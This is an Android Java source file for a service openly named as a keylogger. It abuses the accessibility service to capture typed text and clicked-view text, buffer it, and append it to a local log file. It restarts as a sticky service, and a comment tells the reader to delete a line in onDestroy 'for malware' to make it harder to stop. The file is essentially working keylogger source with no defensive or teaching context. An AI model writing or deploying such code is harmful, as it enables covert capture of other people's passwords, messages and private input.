package com.example.new_keylogger;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.annotation.RequiresApi;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;

@RequiresApi(api = Build.VERSION_CODES.DONUT)
public class AccessibilityKeyDetector extends AccessibilityService {
    private static final String TAG = "onDestroy";
    public String s = "";
    private int len_s = 0;
    public int start = START_STICKY;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        open_create_file();
        return this.start;
    }

    public void open_create_file(){
        try {
            FileOutputStream file = openFileOutput("example.txt", MODE_APPEND);
            OutputStreamWriter outputWriter = new OutputStreamWriter(file);
            outputWriter.append("[New service created]");
            outputWriter.close();
            file.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public void write_file(String text){
        try {
            FileOutputStream file = openFileOutput("example.txt", MODE_APPEND);
            OutputStreamWriter outputWriter = new OutputStreamWriter(file);
            outputWriter.append(text);
            outputWriter.close();
            file.close();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    protected void onServiceConnected() {

    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "Destroying.......................");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            disableSelf();
        }
        super.onDestroy();  //delete this line for malware
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch(event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                save_event(data);
                break;
            }
            default:
                break;
        }
    }

    public void save_event(String data) {
        s = s + data;
        len_s = len_s + 1;
        if (len_s >= 10) {
            write_file(s);
            s = "";
            len_s = 0;
        }
    }

    @Override
    public void onInterrupt() {

    }
}